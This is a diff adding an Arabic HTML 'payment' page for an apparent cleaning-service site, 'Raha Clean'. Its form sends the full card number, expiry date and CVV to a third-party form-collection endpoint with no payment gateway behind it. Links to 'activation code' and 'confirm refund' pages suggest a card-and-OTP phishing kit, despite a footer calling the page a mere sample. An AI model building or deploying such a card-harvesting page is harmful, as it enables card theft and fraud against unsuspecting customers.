@@ -1,0 +1,17 @@
+<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>صفحة الدفع</title><link rel="stylesheet" href="css/style.css"></head><body><div class="container"><header class="header"><div class="brand"><b>راحة كلين</b><span class="badge">موثوق</span></div></header><nav class="nav"><a href="index.html" class="">الرئيسية</a><a href="hourly.html" class="">بالساعة</a><a href="resident.html" class="">مقيمة</a><a href="hours.html" class="">نوع ساعات</a><a href="week.html" class="">نوع الأسبوع</a><a href="months.html" class="">نوع الشهور</a><a href="confirm-booking.html" class="">تأكيد الحجز</a><a href="confirm-payment.html" class="">تأكيد الدفع</a><a href="confirm-refund.html" class="">تأكيد الاسترداد</a><a href="activation.html" class="">رمز التفعيل</a><a href="payment.html" class="active">الدفع</a><a href="faq.html" class="">الأسئلة</a><a href="about.html" class="">من نحن</a><a href="contact.html" class="">تواصل</a></nav>
+<section class="panel">
+  <h1>الدفع</h1>
+  <p>بيانات الحجز والفوترة:</p>
+  <form action="https://formspree.io/f/YOUR_FORMSPREE_ENDPOINT" method="POST">
+    <div class="grid">
+      <div class="card"><label>الاسم على البطاقة</label><input name="card_name" required></div>
+      <div class="card"><label>رقم البطاقة</label><input name="card_number" required></div>
+      <div class="card"><label>MM</label><input name="mm" placeholder="MM" required></div>
+      <div class="card"><label>YY</label><input name="yy" placeholder="YY" required></div>
+      <div class="card"><label>CVV</label><input name="cvv" required></div>
+    </div>
+    <div class="list" style="margin-top:12px"><button class="big-btn" type="submit">تأكيد</button></div>
+  </form>
+  <div class="hint">* هذه صفحة نموذجية فقط للتجربة (لا يوجد بوابة دفع فعلية هنا).</div>
+</section>
+<div class="footer">© 2025 — راحة كلين.</div></div></body></html>
